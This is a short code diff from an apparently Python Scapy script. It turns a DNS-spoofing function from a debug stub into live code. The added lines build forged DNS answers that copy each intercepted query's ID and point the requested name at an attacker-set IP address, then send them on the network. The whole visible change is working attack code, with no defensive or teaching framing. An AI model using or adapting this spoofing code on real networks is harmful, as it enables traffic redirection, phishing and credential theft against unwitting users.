@@ -16,9 +16,8 @@ Popen([firewall], shell=True, stdout=PIPE)
 
 def dnsspoof(rec : IP):
     if rec.haslayer(DNS) and rec.getlayer(DNS).qr==0:
-        print("yeah")
-        #spoof = IP(dst=a[0].getlayer(IP).src, src=a[0].getlayer(IP).dst)/UDP(dport=a[0].getlayer(UDP).sport, sport=a[0].getlayer(UDP).dport)/DNS(id=a[0].getlayer(DNS).id, qd=a[0].getlayer(DNS).qd, qr=1,an=DNSRR(rrname=a[0].getlayer(DNS).qd.qname, ttl=10, rdata=gotoIP) / DNSRR(rrname=a[0].getlayer(DNS).qd.qname, ttl=10, rdata=gotoIP))
-        #sendp(spoof, verbose=1)
+        spoof = IP(dst=rec[IP].src, src=rec[IP].dst)/UDP(dport=rec[UDP].sport, sport=rec[UDP].dport)/DNS(id=rec[DNS].id, qd=rec[DNS].qd, qr=1,an=DNSRR(rrname=rec[DNS].qd.qname, ttl=10, rdata=gotoIP) / DNSRR(rrname=rec[DNS].qd.qname, ttl=10, rdata=gotoIP))
+        sendp(spoof, verbose=1)
 
 
 
